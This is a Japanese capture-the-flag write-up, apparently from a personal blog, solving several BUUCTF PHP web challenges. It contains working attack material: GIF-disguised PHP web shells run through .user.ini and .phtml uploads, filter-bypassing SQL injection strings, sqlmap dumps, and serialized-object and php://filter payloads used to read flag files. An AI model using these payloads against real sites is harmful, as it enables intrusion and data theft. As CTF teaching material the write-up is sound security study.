> PHP の設定は、php.ini で行います。Apache の環境では、.htaccess ファイルを使用して、仮想ディレクトリごとに php.ini の設定を上書きすることができます。IIS で PHP を利用する場合、これまで php.ini の設定を上書きする標準的な方法は存在しなかったため、Web サーバーごとに1つの設定しか利用できませんでした。PHP 5.3.0 以降では、php.ini に新機能が追加され、IIS 環境でサイトや仮想ディレクトリごとに php.ini の設定を上書きできるようになりました。詳しくは、「PHP: INI ファイルの扱いに関する変更」

```
php.ini の設定を上書きする方法は2つあります。1つは、.user.ini ファイルを使用する方法です。.user.ini を使用するには、php.ini ファイルに追加された新しいディレクティブ user_ini_.filename と user_ini.cache_ttl を使用します。一例として、アップロード可能なファイルサイズの上限値である upload_max_filesize（既定値は 2MB）の設定値を仮想ディレクトリごとに変更してみましょう。まず、PHP のバイナリをインストールしたフォルダーにある php.ini ファイルを編集して、次の2つのディレクティブを設定します。

--- C:\Program Files(x86)\PHP\php.ini ---
user_ini_.filename = ".user.ini"
user_ini.cache_ttl = 300
-----------------------------------------

　次に、設定を上書きしたい仮想ディレクトリのフォルダー内に .user.ini ファイルを作成し、次のように上書きする設定を行います。
```

つまり、phpファイルをアップロードしてphpを実行させることはできない??のでphpの設定ファイルを書き換えて、index.phpを実行させる前に事前にアップロードした画像に偽装させたphpファイルを実行させる。\\
そこで.user.iniを利用してphp.iniを上書きする。

また、<?php ?>が使えないので、<script language=“php”></scrip>を利用する

> PHP 5 では、PHP の cnfigure 方法に応じて最大で五種類の開始タグ・終了タグが使えます。 そのうちの二つである <?php ?> と <script language="php"> </script> は、常に使えます。 また、短い形式の echo タグ <?= ?> も、 PHP 5.4.0 以降では常に使えます。

```
$ cat .user.ini                                                             
GIF89a
auto_prepend_file=shell.jpgk
```
```
$ cat shell.jpg 
GIF89a
<script language="php">echo system($_GET['cmd']);</script>
```

```
Your dir uploads/04b0951938d905b41348c1548f9c338b 
Your files : 
array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" [3]=> string(9) "index.php" [4]=> string(9) "shell.jpg" } 
```

## /uploads/04b0951938d905b41348c1548f9c338b/index.php?cmd=cat%20/flag

```
GIF89a flag{8f5ae8cd-f210-4514-980d-f0eaedf4f7f3} flag{8f5ae8cd-f210-4514-980d-f0eaedf4f7f3}
```

# [极客大挑战 2019]BabySQL
```
username: admin
password: 1' union select 1,2,3#
```
```
Error!

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1,2,3#'' at line 1
```
出力が足りないのでサーバ側で入力を正規表現かなにかで弾かれています。

```
username: admin
password: 1' ununionion seselectlect 1,2,3#
```
```
Hello 2！


Your password is '3'
```
```
username: admin
password: 1' uniunionon seleselectct 1,group_concat(table_name),group_concat(column_name) frfromom infoorrmation_schema.columns#
```
```
threads,threads,users,users,users,Flag,b4bsql,b4bsql,b4bsql,geekuser,geekuser,geekuser！<
,flag,id,username,password,id,username,password
```

```
1' uniunionon seleselectct 1,group_concat(username),group_concat(passwoorrd) frfromom geekuser#
```
```html
<p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Your password is '329404111e9961c85a030331820495d5'</p>
```
```
1' uniunionon seleselectct 1,2,group_concat(flag) frfromom Flag#
```
FlagというテーブルがあったのでtableがFlagでcolumがflagかと思ったらうまくいきませんでした。\
残りはb4bsqlというテーブルなのでusername,passwordを出力できるか試してみました。
```
1' uniunionon seleselectct 1,group_concat(username),group_concat(passwoorrd) frfromom b4bsql#
```
```html
<p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Your password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{15b7f2e9-53e8-43d8-9f20-74cdf3ac119a}'</p>
```

# [极客大挑战 2019]Upload

```<?```
がフィルターされてるので他の代替を考える。

```
GIF89a
<script language="php">system($_GET['cmd']);</script>
```

拡張子が.phpはフィルターされてるのでほかの代替を考える。
```
NOT！php! 
```

wikipediaをみてみると
```
Filename extensions	.php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar
```
があるようです
拡張子をphtmlにすることで上記のphpを実行させる。
しかし、画像ファイルじゃないとアップロードできない。
拡張子でチェックしているわけではなくContent-typeをみているのでburpでContent-typeをimage/jpegに変更してforwardする。


## shell.phtml?cmd=cat%20/flag
```
GIF89a flag{4ae465ec-f085-4c73-aeab-cd678b3ed2f6} flag{4ae465ec-f085-4c73-aeab-cd678b3ed2f6}
```

# [ACTF2020 新生赛]BackupFile

問題の名前からしてバックアップファイルが存在すると考えられるのでdirsearchをつかってディレクトリやファイルをenumerateします。

```
$ python3 ./dirsearch.py -u http://74e61b6d-5f8b-4981-ae58-1c278c389024.node3.buuoj.cn/ -e php -s 1

 _|. _ _  _  _  _ _|_    v0.3.9                                                  
(_||| _) (/_(_|| (_| )                                                           
                                                                                 
Extensions:  | HTTP method: GET | Suffixes: php | Threads: 10 | Wordlist size: 6498 | Request count: 6498                                                         

Error Log: /home/kali/dirsearch/logs/errors-20-08-15_04-04-09.log

Target: http://74e61b6d-5f8b-4981-ae58-1c278c389024.node3.buuoj.cn/              
                                                                                 
Output File: /home/kali/dirsearch/reports/74e61b6d-5f8b-4981-ae58-1c278c389024.node3.buuoj.cn/20-08-15_04-04-11

[04:04:11] Starting: 
[04:07:23] 400 -  154B  - /%2e%2e/google.com                          
[04:07:23] 200 -   28B  - /php                
[04:09:04] 200 -   28B  - /adminphp                                  
[04:13:44] 200 -   28B  - /index.php                                 
[04:13:46] 200 -  347B  - /index.php.bak                             
[04:15:14] 200 -   28B  - /myadminphp                                
                                                                     
Task Completed
```

```
% cat index.php.bak 
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

intval関数とは
> intval — 変数の整数としての値を取得する

GETで受け取ったkeyを整数に変換したものと$strに代入されてる文字列を比較してるだけです。

適当に?key=123とうったらflagがでてきました。
```
flag{02ce6e8f-c87a-4c79-a2b4-622b5e24bfeb}
```

これはPHP type jugglingを利用したものでphpで==で比較するとき、文字列と整数を比較すると文字列を整数に変換しようとするので先頭の数字の部分さえあっていればtrueを返してしまうものを利用していると考えられます。

## 参考サイト

https://yohhoy.hatenadiary.jp/entry/20180529/p1

# [ACTF2020 新生赛]Upload

javascriptで簡単なバリデーションをして拡張子が画像ファイルかチェックしてるのでburpで書き換える。

.phpは
```
nonono~ Bad file！
```

と怒られるので、phtmlを利用する

```phtml
GIF89a
<script language="php">system($_GET['cmd']);</script>
```
## uplo4d/173e630e30310031738278ea85a6285f.phtml?cmd=cat /flag
```
GIF89a flag{3447f2f2-fc30-43f3-a4e9-a8188e79ba2a} 
```

# [极客大挑战 2019]BuyFlag

/pay.phpに
```
<!-- ~~~post money and password~~~
if (isset($_POST['password'])){
	$password = $_POST['password']; 
	if (is_numeric($password)) {
		echo "password can't be number</br>"; 
	}elseif ($password == 404) {
		echo "Password Right!</br>"; 
	}
}
```
```
% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" --data "password=404"
```

```
Only Cuit's students can buy the FLAG
```

とりあえず、どうやってCUITの生徒であると偽装するかを考えます。

CUITとはコロンビア大学っぽいのでコロンビア大学の学生ポータルサイトをrefererで指定してみたり、x-forwarded-forで指定してみたり、したんですがダメでした。

Cookieにuser: 0と怪しい値が入っていたので1に変更してみると

```
<p>
you are Cuiter</br>Please input your password!!	
</p>
```

というレスポンスが返ってきました。

```
% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" -H "Cookie: user=1" --data "password=404"

<p>If you want to buy the FLAG:</br>
You must be a student from CUIT!!!</br>
You must be answer the correct password!!!
</p>
<hr />
<p>
you are Cuiter</br>password can't be number</br>	
</p>	
```

ここでburpでpasswordをPOSTしてもinput your password!!としか返ってこなかったんですが、curlでやったらいけました。
ただし、can’t be numberって怒られてるので整数じゃなくてかつ404との比較が==なので、PHP type jugglingを利用して404のあとに適当な文字列をくっつければ

```
<p>
you are Cuiter</br>Password Right!</br>Pay for the flag!!!hacker!!!</br>	
</p>
```
といわれます。

```
% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" -H "Cookie: user=1" --data "password=404'&money=100000000"

<p>
you are Cuiter</br>Password Right!</br>Nember lenth is too long</br>	
</p>
```

これも==で比較していると予想してmoneyを配列にすれば0を返しtrueになります

```
% curl -i "http://f1b9a491-f619-4607-8e9d-2a1631396edb.node3.buuoj.cn/pay.php" -H "Cookie: user=1" --data "password=404'&money[]=1"

<p>
you are Cuiter</br>Password Right!</br>flag{e0d13d99-37f0-4359-a3b3-ea4e1c0833d4}
</br>	
</p>
```

# [网鼎杯 2018]Fakebook

アカウントを適当に作ってみてみると

http://fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn/view.php?no=

ここにSQLiがある。
とりあえず、
```
GET /view.php?no=1+or+1=1# HTTP/1.1
```
は通る。

```
GET /view.php?no='+union+select+1,2,3# HTTP/1.1
```

```
no hack ~_~
```
フィルターかかっている。

```
$ sqlmap -u "http://fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn/view.php?no=2" --dbs --batch

---
Parameter: no (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: no=-6814 OR 3661=3661#

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: no=(CASE WHEN (1403=1403) THEN SLEEP(5) ELSE 1403 END)
---


[07:53:42] [CRITICAL] unable to retrieve the database names
```

sqlmapやってみてもdatabaseの名前をretrieveできない。\\


niktoをつかって簡単な脆弱性スキャンをする

```
$ nikto -h http://fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          111.73.46.229
+ Target Hostname:    fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.cn
+ Target Port:        80
+ Start Time:         2020-08-15 08:01:09 (GMT-4)
---------------------------------------------------------------------------
+ Server: openresty
+ Retrieved x-powered-by header: PHP/5.6.40
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/user.php.bak' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ /fe10593a-c262-440a-86ce-d52cc18f807cnode3.tar: Potentially interesting archive/cert file found.
+ /backup.war: Potentially interesting archive/cert file found.
+ /site.pem: Potentially interesting archive/cert file found.
+ /node3.tar.bz2: Potentially interesting archive/cert file found.
+ /fe10593a-c262-440a-86ce-d52cc18f807c.node3.buuoj.alz: Potentially interesting archive/cert file found.
```

user.php.bak
```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

```
$ python3 dirsearch.py -u http://3d78d8bd-41d8-4439-9a1f-aa438b3cf806.node3.buuoj.cn -e php -s 1

[20:40:18] Starting: 
[20:43:10] 400 -  154B  - /%2e%2e/google.com                          
[20:43:10] 200 -    1KB - /php                 
[20:44:41] 200 -    1KB - /adminphp                                  
[20:47:10] 301 -  185B  - /css  ->  http://3d78d8bd-41d8-4439-9a1f-aa438b3cf806.node3.buuoj.cn/css/
[20:48:52] 200 -    1KB - /index.php                                 
[20:49:10] 301 -  185B  - /js  ->  http://3d78d8bd-41d8-4439-9a1f-aa438b3cf806.node3.buuoj.cn/js/
[20:49:33] 200 -    1KB - /login.php                                 
[20:50:13] 200 -    1KB - /myadminphp                                
[20:51:41] 200 -   37B  - /robots.txt                                
[20:53:22] 200 -    0B  - /user.php                                  
[20:53:33] 200 - 1019B  - /view.php 
```


SSRF攻撃とは
> SSRF攻撃とは、攻撃者から直接到達できないサーバーに対する攻撃手法の一種です。

SSRF攻撃が可能な脆弱性
> SSRF攻撃が可能となる脆弱性には、CWE-918とCWE-611の他に以下があります。

> ・ディレクトリトラバーサル（CWE-22）
> ディレクトリトラバーサルとCWE-918は、脆弱性混入のメカニズムが非常に似ています。パラメータの中身がURLかパス名かという違いだけです。PHP等ではfopen等ファイル名を扱う機能でURLを指定できるため、ディレクトリトラバーサル脆弱性の悪用でSSRF攻撃が可能になります。

> ・OSコマンドインジェクション
> OSコマンドインジェクション（CWE-78）や、ファイルインクルード（LFI/RFI）（CWE-98）、安全でないデシリアライゼーション（CWE-502）などリモートコード実行(RCE)可能な脆弱性があれば、wgetやcurl等を利用してSSRF攻撃ができます。

> ・SQLインジェクション
> SQLインジェクション（CWE-89）でも任意コマンド実行が可能な場合がありますし、データベースから他のデータベースに接続する機能などがSSRF攻撃の踏み台として使える場合があります。以下の記事は、PostgreSQLを悪用したSSRF攻撃の例が紹介されています。

今回の場合は、SQLインジェクションをつかってSSRF攻撃をし、他のデータベースに不正にアクセスすると考えられます。


/join.ok.phpのページにもSQLインジェクションがあるのでsqlmapで確認してみる。


join.ok.phpにフォームでPOSTするときのリクエストを保存してsqlmapつかう
```
$ sqlmap -r req.txt --dbs --batch

sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=test' AND 4652=4652 AND 'eiRh'='eiRh&passwd=test&age=0&blog=http://test.com

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=test' OR (SELECT 4752 FROM(SELECT COUNT(*),CONCAT(0x71706a7071,(SELECT (ELT(4752=4752,1))),0x716b7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'mGFv'='mGFv&passwd=test&age=0&blog=http://test.com

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
    Payload: username=test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck&passwd=test&age=0&blog=http://test.com
---

available databases [5]:
[*] fakebook
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
```
```
$ sqlmap -r req.txt -D fakebook --tables --batch

[1 table]
+-------+
| users |
+-------+
```

```
$ sqlmap -r req.txt -D fakebook -T users --dump-all --batch

Table: users
[14 entries]
+------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------+
| no   | data                                                                                                                                                                                                                             | passwd                                                                                                                                  | username                                                                                             |
+------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------+
| 1    | O:8:"UserInfo":3:{s:4:"name";s:4:"unko";s:3:"age";i:20;s:4:"blog";s:15:"http://blog.com";}                                                                                                                                       | 2929c149092ce9bdc3149156fc07f58039a6b430753c574285c794d9487a4ecb2adeb6a250623442d53f3ed8706cbea4ba6698b5614d2fb0a6bad6a7335a54b2 (unko) | unko                                                                                                 |
| 2    | O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test                                                                                                 |
| 3    | O:8:"UserInfo":3:{s:4:"name";s:4:"4177";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | 4177                                                                                                 |
| 4    | O:8:"UserInfo":3:{s:4:"name";s:36:"test' AND 3748=5040 AND 'OdrF'='OdrF";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                       | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 3748=5040 AND 'OdrF'='OdrF                                                                 |
| 5    | O:8:"UserInfo":3:{s:4:"name";s:36:"test' AND 1343=4332 AND 'moEQ'='moEQ";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                       | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 1343=4332 AND 'moEQ'='moEQ                                                                 |
| 6    | O:8:"UserInfo":3:{s:4:"name";s:53:"test' AND (SELECT 0x58654e71)='FpqW' AND 'usTK'='usTK";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                      | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND (SELECT 0x58654e71)='FpqW' AND 'usTK'='usTK                                                |          
| 7    | O:8:"UserInfo":3:{s:4:"name";s:137:"test' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71706a7071,(SELECT (ELT(9958=9958,1))),0x716b7a7671)) USING utf8))) AND 'MANs'='MANs";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";} | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71706a7071,(SELECT (ELT(9958=9958,1))),0x716b7a |
| 8    | O:8:"UserInfo":3:{s:4:"name";s:98:"(SELECT CONCAT(CONCAT(0x71706a7071,(CASE WHEN (4460=4460) THEN 0x31 ELSE 0x30 END)),0x716b7a7671))";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | (SELECT CONCAT(CONCAT(0x71706a7071,(CASE WHEN (4460=4460) THEN 0x31 ELSE 0x30 END)),0x716b7a7671))   |
| 9    | O:8:"UserInfo":3:{s:4:"name";s:61:"(SELECT CONCAT(0x71706a7071,(ELT(2868=2868,1)),0x716b7a7671))";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                              | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | (SELECT CONCAT(0x71706a7071,(ELT(2868=2868,1)),0x716b7a7671))                                        |
| 10   | O:8:"UserInfo":3:{s:4:"name";s:35:"test' AND SLEEP(5) AND 'Dnhi'='Dnhi";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND SLEEP(5) AND 'Dnhi'='Dnhi                                                                  |
| 11   | O:8:"UserInfo":3:{s:4:"name";s:19:"test' AND SLEEP(5)#";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                                                                        | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND SLEEP(5)#                                                                                  |
| 12   | O:8:"UserInfo":3:{s:4:"name";s:66:"test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck                                   |
| 13   | O:8:"UserInfo":3:{s:4:"name";s:66:"test' AND 6785=BENCHMARK(0000000,MD5(0x4c765849)) AND 'fAck'='fAck";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 6785=BENCHMARK(0000000,MD5(0x4c765849)) AND 'fAck'='fAck                                   |
| 14   | O:8:"UserInfo":3:{s:4:"name";s:66:"test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck";s:3:"age";i:0;s:4:"blog";s:15:"http://test.com";}                                                                         | ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff (test) | test' AND 6785=BENCHMARK(5000000,MD5(0x4c765849)) AND 'fAck'='fAck                                   |
+------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------+
```

sqlの結果をみるかぎり、no,data,passwd,usernameでカラムは4つでdataにserializedされたデータが格納されている。

なので、union select 1,2,3,4 の中でどこかがdataに該当してunserializedする処理があると推測できる。
今回はそれが4番目なので4番目にUserInfoのserializedされた結果を挿入する。

```php
<?php
class UserInfo{
	public $name = "test";
	public $age = 0;
	public $blog = "file:///var/www/html/flag.php";
}

$test = new UserInfo();
echo serialize($test);
?>
```

```
$ php solve.php 
O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:0;s:4:"blog";s:29:”file:///var/www/html/flag.php";}
```

## view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'%23

```
$ echo -n 'PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s2ZGZmN2JlNC1jOTJiLTRhYzgtYjg2NS1lZTE0NmY4ZTM1MjB9IjsNCmV4aXQoMCk7DQo=' | base64 -d
<?php

$flag = "flag{6dff7be4-c92b-4ac8-b865-ee146f8e3520}";
exit(0);
```

# [ZJCTF 2019]NiZhuanSiWei

```
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

"welcome to the zjctf”が書き込まれてるファイルがあるのかなと思って、dirsearchやgobusterなどやってみましたが特に何もなかったです。

ここfile_get_contentsに注目します。

file_get_contents関数とは
> file_get_contents — ファイルの内容を全て文字列に読み込む

phpのドキュメントをみてみると
>  echo file_get_contents('php://input');
というようにhttp以外のスキームも当たり前に使えます。

ちなみにphp://inputは
> php://input は読み込み専用のストリームで、 リクエストの body 部から生のデータを読み込むことができます。


ここでdata://というスキームを利用します。
> データURIスキーム（英語: data URI scheme）とは、あたかも外部リソースを読み込むのと同じように、ウェブページにインラインにデータを埋めこむ手段を提供するURIスキームである。

> データをテキスト形式で埋め込むのでHTTPリクエストやヘッダのトラフィックが低減できる。データによってはそのまま埋め込むことができないためエンコードのためのオーバーヘッドが起こる（例えば、600バイトのデータをデータURIスキームで埋め込む場合、Base64でエンコードされ約800バイトになり、200バイトほどデータ量は増える）が、それでもトラフィックを軽減できる事の方が有用である。

つまり、外部のファイルがなくても任意のデータを作れそうです。

書式としては
> data:[<MIME-type>][;charset=<encoding>][;base64],<data>

```
% echo -n 'welcome to the zjctf' | base64
d2VsY29tZSB0byB0aGUgempjdGY=
```

つまり、
```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

つぎに
```
include($file);  //useless.php
```
ここもクエリをそのままincludeしてるのでphp://をつかってリソースをbase64でエンコードしファイルの中身をみます。
```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
```

```
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

```
% echo -n 'PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=' | base64 -d
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

そして
```
$password = unserialize($password);
```
$passwordがそのままunserializedされてるので任意のオブジェクトを生成することができます。

```php
<?php

class Flag{  //flag.php  
    public $file="flag.php";  
}  
$a = new Flag();
echo serialize($a);
?>
```

```
% php solve.php
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

```
http://7f8d93d5-377c-463b-bf80-c202780bdeff.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```

```
<br>
<h1>welcome to the zjctf</h1>
</br>
<br>oh u find it </br>
<!--but i cant give it to u now-->
<?php if(2===3){
	return ("flag{404d0ade-fd76-4a75-85d7-1b56ad689c09}"); } 
?>
<br>U R SO CLOSE !///COME ON PLZ

